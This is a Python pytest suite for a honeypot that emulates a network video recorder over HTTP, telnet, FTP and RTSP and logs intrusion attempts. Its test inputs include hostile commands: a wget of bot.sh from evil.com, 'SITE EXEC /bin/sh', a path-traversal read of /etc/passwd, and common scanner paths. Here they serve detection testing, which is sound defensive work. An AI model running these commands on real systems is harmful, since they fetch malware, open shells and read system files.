"""
Tests for honeypot handlers: Flask HTTP routes, telnet, FTP, RTSP,
log_event, _short_summary, _get_session
"""
import json
import os
import time
import pytest
from unittest.mock import patch, MagicMock, call
from datetime import datetime

import netwatch


# ═══════════════════════════════════════════════════════════
#  _short_summary
# ═══════════════════════════════════════════════════════════

class TestShortSummary:
    @pytest.mark.parametrize("service,data,expected_contains", [
        ("credential", {"username": "admin", "password": "1234"}, "admin:****"),
        ("telnet", {"username": "root", "password": "toor"}, "login root/****"),
        ("telnet_cmd", {"command": "wget http://evil.com/bot.sh"}, "cmd: wget"),
        ("malware_attempt", {"command": "chmod +x /tmp/bot"}, "MALWARE"),
        ("rtsp", {}, "RTSP probe"),
        ("rtsp_auth", {}, "RTSP probe"),
        ("api_probe", {"method": "POST"}, "API probe POST"),
        ("onvif_probe", {}, "ONVIF probe"),
        ("scan_probe", {"method": "GET", "path": "/admin/config"}, "GET /admin/config"),
        ("dashboard_access", {}, "viewed dashboard"),
        ("http", {"method": "GET", "path": "/login"}, "GET /login"),
        ("unknown_service", {}, "unknown_service"),
    ])
    def test_summary_formats(self, service, data, expected_contains):
        result = netwatch._short_summary(service, "1.2.3.4", data)
        assert expected_contains in result

    def test_long_command_truncated(self):
        data = {"command": "A" * 100}
        result = netwatch._short_summary("telnet_cmd", "1.2.3.4", data)
        assert len(result) < 50  # truncated to 40 + "cmd: "

    def test_empty_data(self):
        result = netwatch._short_summary("credential", "1.2.3.4", {})
        assert result == ":"  # empty username:empty password

    def test_none_values(self):
        # get with default empty string should still work
        result = netwatch._short_summary("telnet", "1.2.3.4", {"username": None, "password": None})
        # Should not crash - returns "login None/None" or similar
        assert "login" in result


# ═══════════════════════════════════════════════════════════
#  log_event
# ═══════════════════════════════════════════════════════════

class TestLogEvent:
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_appends_to_honeypot_events(self, mock_rotate):
        netwatch.log_event("telnet", "1.2.3.4", {"username": "root", "password": "pass"})
        assert len(netwatch.honeypot_events) == 1
        assert netwatch.honeypot_events[0]["service"] == "telnet"
        assert netwatch.honeypot_events[0]["ip"] == "1.2.3.4"

    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_max_events_cap(self, mock_rotate):
        for i in range(netwatch.MAX_EVENTS + 10):
            netwatch.log_event("test", f"1.2.3.{i%256}", {"port": i})
        assert len(netwatch.honeypot_events) <= netwatch.MAX_EVENTS

    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_truncates_data(self, mock_rotate):
        long_data = {"field": "X" * 1000}
        netwatch.log_event("test", "1.2.3.4", long_data)
        # The entry should have been created (truncation happens internally)
        assert len(netwatch.honeypot_events) == 1

    @patch("netwatch._rotate_log")
    def test_writes_to_file(self, mock_rotate, tmp_path):
        logfile = tmp_path / "test.json"
        allfile = tmp_path / "all_events.json"
        with patch.object(netwatch, "LOG_DIR", str(tmp_path)):
            netwatch.log_event("telnet", "1.2.3.4", {"username": "admin"})
        # Files should be created
        assert (tmp_path / "telnet.json").exists()
        assert (tmp_path / "all_events.json").exists()

    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_event_has_timestamp(self, mock_rotate):
        netwatch.log_event("test", "1.2.3.4", {})
        assert "time" in netwatch.honeypot_events[0]


# ═══════════════════════════════════════════════════════════
#  _get_session
# ═══════════════════════════════════════════════════════════

class TestGetSession:
    def test_creates_new_session(self):
        sess = netwatch._get_session("1.2.3.4")
        assert sess["attempts"] == 0
        assert sess["authed"] == False
        assert "threshold" in sess

    def test_returns_existing_session(self):
        netwatch._get_session("1.2.3.4")
        netwatch._session_store["1.2.3.4"]["attempts"] = 5
        sess = netwatch._get_session("1.2.3.4")
        assert sess["attempts"] == 5

    def test_expires_old_session(self):
        netwatch._session_store["1.2.3.4"] = {
            "attempts": 10, "threshold": 3, "authed": True,
            "ts": time.time() - netwatch.SESSION_TTL - 1
        }
        sess = netwatch._get_session("1.2.3.4")
        assert sess["attempts"] == 0  # Fresh session

    def test_evicts_oldest_at_capacity(self):
        # Fill to max
        for i in range(netwatch.MAX_SESSIONS):
            netwatch._session_store[f"10.{i//65536}.{(i//256)%256}.{i%256}"] = {
                "attempts": 0, "threshold": 3, "authed": False,
                "ts": time.time() - i  # Older timestamps for higher i
            }
        # Add new one should evict oldest
        sess = netwatch._get_session("99.99.99.99")
        assert len(netwatch._session_store) <= netwatch.MAX_SESSIONS

    def test_threshold_randomized(self):
        thresholds = set()
        for i in range(50):
            netwatch._session_store.clear()
            sess = netwatch._get_session(f"1.2.3.{i}")
            thresholds.add(sess["threshold"])
        # Should have at least 2 different values (randomized 3-7)
        assert len(thresholds) > 1


# ═══════════════════════════════════════════════════════════
#  Flask HTTP Honeypot Routes
# ═══════════════════════════════════════════════════════════

class TestFlaskRoutes:
    def test_index_redirects_to_login(self, flask_client):
        resp = flask_client.get("/")
        assert resp.status_code == 302
        assert "/login" in resp.headers["Location"]

    def test_login_get(self, flask_client):
        resp = flask_client.get("/login")
        assert resp.status_code == 200
        assert b"NVR PRO 4200" in resp.data

    def test_login_post_logs_credential(self, flask_client):
        resp = flask_client.post("/login", data={"username": "admin", "password": "12345"})
        assert resp.status_code in (200, 302)
        # Should have logged the credential
        cred_events = [e for e in netwatch.honeypot_events if e["service"] == "credential"]
        assert len(cred_events) >= 1

    def test_login_eventually_grants_access(self, flask_client):
        # After threshold attempts, should redirect to dashboard
        for i in range(10):
            resp = flask_client.post("/login", data={"username": "admin", "password": f"try{i}"})
            if resp.status_code == 302 and "/dashboard" in resp.headers.get("Location", ""):
                break
        # At some point it should grant access
        sess = netwatch._get_session("127.0.0.1")
        # Either authed or many attempts recorded
        assert sess["attempts"] >= 1

    def test_dashboard_without_auth_redirects(self, flask_client):
        resp = flask_client.get("/dashboard")
        assert resp.status_code == 302
        assert "/login" in resp.headers["Location"]

    def test_dashboard_with_auth(self, flask_client):
        netwatch._session_store["127.0.0.1"] = {
            "attempts": 5, "threshold": 3, "authed": True, "ts": time.time()
        }
        resp = flask_client.get("/dashboard")
        assert resp.status_code == 200
        assert b"Recording" in resp.data or b"NVR" in resp.data

    def test_api_config(self, flask_client):
        resp = flask_client.get("/api/config")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["device"] == "NVR-4200-PRO"
        assert data["channels"] == 16

    def test_onvif_endpoint(self, flask_client):
        resp = flask_client.get("/onvif/device_service")
        assert resp.status_code == 200
        assert b"NVR-4200-PRO" in resp.data
        assert resp.content_type == "application/xml"

    def test_onvif_post(self, flask_client):
        resp = flask_client.post("/onvif/device_service", data="<soap>test</soap>")
        assert resp.status_code == 200

    def test_logout_redirects(self, flask_client):
        resp = flask_client.get("/logout")
        assert resp.status_code == 302
        assert "/login" in resp.headers["Location"]

    def test_catch_all_404(self, flask_client):
        resp = flask_client.get("/admin/console")
        assert resp.status_code == 404

    def test_catch_all_logs_probe(self, flask_client):
        flask_client.get("/admin/config.php")
        probe_events = [e for e in netwatch.honeypot_events if e["service"] == "scan_probe"]
        assert len(probe_events) >= 1

    def test_catch_all_methods(self, flask_client):
        for method in ["GET", "POST", "PUT", "DELETE"]:
            resp = getattr(flask_client, method.lower())("/test_path")
            assert resp.status_code == 404

    def test_http_logging_all_requests(self, flask_client):
        flask_client.get("/anything")
        http_events = [e for e in netwatch.honeypot_events if e["service"] == "http"]
        assert len(http_events) >= 1

    def test_api_config_post(self, flask_client):
        resp = flask_client.post("/api/config", json={"admin": True})
        assert resp.status_code == 200

    @pytest.mark.parametrize("path", [
        "/wp-admin/",
        "/.env",
        "/phpmyadmin/",
        "/api/v1/users",
        "/cgi-bin/test",
        "/shell.php",
    ])
    def test_common_scan_paths(self, flask_client, path):
        resp = flask_client.get(path)
        assert resp.status_code == 404
        # Each should log a scan_probe event


# ═══════════════════════════════════════════════════════════
#  Telnet Honeypot Handler
# ═══════════════════════════════════════════════════════════

class TestTelnetHandler:
    @patch("time.sleep")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_handle_telnet_login_sequence(self, mock_rotate, mock_sleep):
        """Test full telnet login flow."""
        client = MagicMock()
        # Simulate: username, password, username2, password2, then "exit"
        client.recv.side_effect = [
            b"admin\r\n",
            b"password123\r\n",
            b"root\r\n",
            b"toor\r\n",
            b"exit\r\n",
        ]
        client.settimeout = MagicMock()
        addr = ("203.0.113.1", 54321)
        netwatch.handle_telnet(client, addr)
        # Should have sent login prompt
        assert client.send.called
        # Should have logged telnet events
        telnet_events = [e for e in netwatch.honeypot_events if e["service"] == "telnet"]
        assert len(telnet_events) >= 1

    @patch("time.sleep")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_telnet_command_responses(self, mock_rotate, mock_sleep):
        """Test command shell emulation."""
        client = MagicMock()
        client.recv.side_effect = [
            b"admin\r\n", b"pass\r\n",
            b"root\r\n", b"toor\r\n",
            b"id\r\n", b"whoami\r\n", b"exit\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_telnet(client, ("1.2.3.4", 12345))
        # Should have sent uid=0 response for "id"
        calls = [str(c) for c in client.send.call_args_list]
        id_response = any(b"uid=0" in c[0][0] for c in client.send.call_args_list if isinstance(c[0][0], bytes))
        assert id_response

    @patch("time.sleep")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_telnet_malware_detection(self, mock_rotate, mock_sleep):
        """Test malware command detection."""
        client = MagicMock()
        client.recv.side_effect = [
            b"admin\r\n", b"pass\r\n",
            b"admin\r\n", b"pass\r\n",
            b"wget http://evil.com/bot.sh\r\n",
            b"exit\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_telnet(client, ("203.0.113.99", 12345))
        malware_events = [e for e in netwatch.honeypot_events if e["service"] == "malware_attempt"]
        assert len(malware_events) >= 1

    @patch("time.sleep")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_telnet_timeout(self, mock_rotate, mock_sleep):
        """Test handling of client timeout."""
        client = MagicMock()
        client.recv.side_effect = Exception("timeout")
        client.settimeout = MagicMock()
        # Should not crash
        netwatch.handle_telnet(client, ("1.2.3.4", 11111))
        client.close.assert_called()

    @patch("time.sleep")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_telnet_connection_counting(self, mock_rotate, mock_sleep):
        """Test connection counter management."""
        client = MagicMock()
        client.recv.side_effect = [b"u\r\n", b"p\r\n", b"u\r\n", b"p\r\n", b"exit\r\n"]
        client.settimeout = MagicMock()
        netwatch._service_conns["telnet"] = 5
        netwatch.handle_telnet(client, ("1.2.3.4", 11111))
        assert netwatch._service_conns["telnet"] == 4  # Decremented


# ═══════════════════════════════════════════════════════════
#  RTSP Honeypot Handler
# ═══════════════════════════════════════════════════════════

class TestRtspHandler:
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_rtsp_probe(self, mock_rotate):
        client = MagicMock()
        client.recv.side_effect = [
            b"DESCRIBE rtsp://10.0.1.9:554/stream1 RTSP/1.0\r\nCSeq: 1\r\n\r\n",
            b"DESCRIBE rtsp://10.0.1.9:554/stream1 RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic YWRtaW46MTIzNA==\r\n\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_rtsp(client, ("203.0.113.1", 55555))
        # Should respond with 401 + log
        assert client.send.called
        rtsp_events = [e for e in netwatch.honeypot_events if "rtsp" in e["service"]]
        assert len(rtsp_events) >= 1

    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_rtsp_timeout(self, mock_rotate):
        client = MagicMock()
        client.recv.side_effect = Exception("timeout")
        client.settimeout = MagicMock()
        netwatch.handle_rtsp(client, ("1.2.3.4", 12345))
        client.close.assert_called()

    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_rtsp_connection_counting(self, mock_rotate):
        client = MagicMock()
        client.recv.side_effect = [b"test\r\n", b""]
        client.settimeout = MagicMock()
        netwatch._service_conns["rtsp"] = 3
        netwatch.handle_rtsp(client, ("1.2.3.4", 12345))
        assert netwatch._service_conns["rtsp"] == 2


# ═══════════════════════════════════════════════════════════
#  FTP Honeypot Handler
# ═══════════════════════════════════════════════════════════

class TestFtpHandler:
    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_login_flow(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS secret123\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("203.0.113.1", 44444))
        # Should send 220 banner and 230 login
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"220" in send_text
        assert b"230" in send_text

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_directory_listing(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"PWD\r\n",
            b"LIST\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        # Should respond to PWD with "/"
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b'257 "/"' in send_text

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_unauthenticated_commands(self, mock_rotate, mock_recon):
        """LIST/RETR without login should get 530."""
        client = MagicMock()
        client.recv.side_effect = [
            b"LIST\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"530" in send_text

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_cwd(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"CWD backup\r\n",
            b"PWD\r\n",
            b"CWD /nonexistent\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"250" in send_text  # CWD success
        assert b"550" in send_text  # nonexistent dir

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_path_traversal_blocked(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"RETR ../../etc/passwd\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"550" in send_text  # Access denied or not found

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_site_exec_logged(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"SITE EXEC /bin/sh\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        exploit_events = [e for e in netwatch.honeypot_events if e["service"] == "ftp_exploit_attempt"]
        assert len(exploit_events) >= 1

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_modify_denied(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"DELE important.db\r\n",
            b"RMD backup\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        # All modify commands should get 550
        assert send_text.count(b"550") >= 2

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_unknown_command(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [
            b"USER admin\r\n",
            b"PASS pass\r\n",
            b"BADCMD\r\n",
            b"QUIT\r\n",
        ]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"502" in send_text

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_syst(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [b"SYST\r\n", b"QUIT\r\n"]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"215 UNIX" in send_text

    @patch("netwatch._ftp_auto_recon")
    @patch("builtins.open", MagicMock())
    @patch("netwatch._rotate_log")
    def test_ftp_feat(self, mock_rotate, mock_recon):
        client = MagicMock()
        client.recv.side_effect = [b"FEAT\r\n", b"QUIT\r\n"]
        client.settimeout = MagicMock()
        netwatch.handle_ftp(client, ("1.2.3.4", 12345))
        sends = [c[0][0] for c in client.send.call_args_list if c[0]]
        send_text = b"".join(s if isinstance(s, bytes) else s.encode() for s in sends)
        assert b"211" in send_text
        assert b"PASV" in send_text


# ═══════════════════════════════════════════════════════════
#  _ftp_auto_recon
# ═══════════════════════════════════════════════════════════

class TestFtpAutoRecon:
    def test_skips_whitelisted(self):
        # Should return immediately for whitelisted IP
        netwatch._ftp_auto_recon("127.0.0.1")
        assert len(netwatch.alerts) == 0

    def test_skips_local(self):
        netwatch._ftp_auto_recon("10.0.1.9")
        assert len(netwatch.alerts) == 0

    @patch("netwatch.subprocess.run")
    @patch("netwatch.banner_grab", return_value="FTP banner")
    def test_successful_recon(self, mock_banner, mock_run):
        mock_run.return_value = MagicMock(
            stdout="21/tcp open ftp\n80/tcp open http\n",
            returncode=0
        )
        with patch("builtins.open", MagicMock()):
            netwatch._ftp_auto_recon("203.0.113.99")
        assert any("AUTO-RECON" in a["msg"] for a in netwatch.alerts)
